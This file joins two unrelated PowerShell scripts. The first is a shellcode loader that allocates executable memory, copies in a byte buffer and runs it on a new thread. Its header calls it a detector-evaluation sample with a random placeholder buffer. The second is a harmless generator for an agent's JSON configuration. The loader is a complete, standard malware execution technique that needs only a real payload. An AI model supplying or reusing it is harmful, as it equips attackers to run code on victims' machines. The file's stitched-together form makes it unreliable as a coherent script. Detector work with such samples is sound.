
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class Win32Api
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x46, 0x4f, 0x0c, 0xa8, 0x0a, 0x8e, 0xb6, 0x54, 0x9a, 0xab, 0x03, 0x55, 0x93, 0x1b, 0x75, 0xc5,
    0x9c, 0xb3, 0xdf, 0xb0, 0xcf, 0xa8, 0x3f, 0x4a, 0x10, 0x91, 0x76, 0x51, 0x14, 0x3d, 0x9c, 0xe4,
    0x1a, 0x1a, 0xcf, 0xbb, 0xd9, 0x75, 0x65, 0x8e, 0xf2, 0xe1, 0xbe, 0x51, 0x53, 0x34, 0xc7, 0x4b,
    0xc3, 0x0c, 0xe7, 0x3d, 0xd7, 0x61, 0xb6, 0xf8, 0xde, 0xcb, 0x54, 0xb5, 0x38, 0xa2, 0x90, 0x18,
    0xf0, 0x85, 0xb8, 0xa7, 0x45, 0x1c, 0xa5, 0x99, 0x56, 0x83, 0x67, 0xdd, 0x9a, 0x68, 0x40, 0x0f,
    0xfd, 0x69, 0xba, 0x99, 0x6b, 0xcc, 0xc2, 0xe9, 0x7c, 0x7f, 0xe5, 0x44, 0x07, 0x76, 0x66, 0xd2,
    0x2b, 0x1a, 0x15, 0x1d, 0xd2, 0x46, 0x75, 0xf8, 0xc4, 0xdf, 0xbe, 0x94, 0xc4, 0x0a, 0xb4, 0xc5,
    0x82, 0x2d, 0xc6, 0x24, 0x64, 0x8a, 0x1d, 0x7d, 0x99, 0x54, 0x3a, 0x74, 0x86, 0x2e, 0x8f, 0xff,
    0x66, 0xb7, 0xad, 0x2a, 0xe0, 0xd0, 0x51, 0x1b, 0x82, 0xa5, 0x35, 0x93, 0xb7, 0x3b, 0x80, 0x58,
    0xfd, 0xea, 0xdc, 0x4b, 0xf5, 0x05, 0xb2, 0xa8, 0x10, 0x96, 0x87, 0x53, 0x2f, 0x80, 0x2b, 0x1b,
    0x1f, 0x0b, 0x30, 0x8d, 0x6c, 0xa4, 0xd6, 0x6e, 0x45, 0xb9, 0xf2, 0xb4, 0x29, 0x26, 0x90, 0x96,
    0x4a, 0x58, 0xdc, 0x86, 0x1e, 0xf6, 0x78, 0xce, 0x96, 0x7d, 0xec, 0x44, 0x9c, 0x7a, 0x17, 0xcd,
    0x9d, 0x36, 0x4a, 0x19, 0x6a, 0x92, 0x5f, 0x46, 0x97, 0xe0, 0x11, 0x92, 0xe9, 0xef, 0xad, 0xca,
    0x38, 0xf3, 0x06, 0xeb, 0x0b, 0xea, 0x68, 0x15, 0xb4, 0x02, 0x1b, 0xce, 0x19, 0x9b, 0x08, 0x33,
    0x2f, 0x60, 0x0b, 0x21, 0x96, 0x40, 0xa0, 0x26, 0x13, 0x97, 0x73, 0x9a, 0x5d, 0x25, 0xf6, 0xf1,
    0xd1, 0x59, 0x25, 0x64, 0xad, 0x46, 0x97, 0x33, 0x37, 0x19, 0xd9, 0x32, 0x45, 0x70, 0xed, 0x22,
    0xf0, 0x7d, 0x13, 0x7a, 0x4f, 0xdc, 0xc4, 0x2a, 0xaa, 0xca, 0xdb, 0x02, 0x30, 0x41, 0x7b, 0x91,
    0x80, 0xb6, 0x4e, 0x0d, 0xce, 0xb3, 0xc3, 0x99, 0xa8
)

$Handle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][Win32Api]::WaitForSingleObject($Thread, 3078)
[void][Win32Api]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
#Requires -Version 5.1
<#
.SYNOPSIS
    Generates the InfraRelay JSON configuration for the selected environment.
.DESCRIPTION
    Builds an ordered configuration object, writes it next to the installed
    agent and validates the result by reading it back.
    An existing configuration is backed up before it is replaced, unless the
    Force switch is specified.
.EXAMPLE
    .\Write-AgentConfig.ps1 -Environment Prod
.NOTES
    Author: Ops Team
    Last updated: 2024-09-20
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$OutputPath = 'C:\ProgramData\Contoso\InfraRelay\config.json',
    [Parameter(Mandatory = $false)]
    [ValidateSet('Dev', "Test", "Staging", 'Prod')]
    [string]$Environment = "Prod",

    [ValidateRange(1024, 65535)]
    [int]$ApiPort = 5000,

    [int]$NodeCount = 6,
    [switch]$Force
)

$DebugPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'InfraRelay'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.contoso.com/v1'
            'https://telemetry.contoso.com/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}
$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)
$config.generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
Write-Host ("Environment: {0} | Port: {1}" -f $roundTrip.environment, $roundTrip.agent.port) -ForegroundColor Cyan
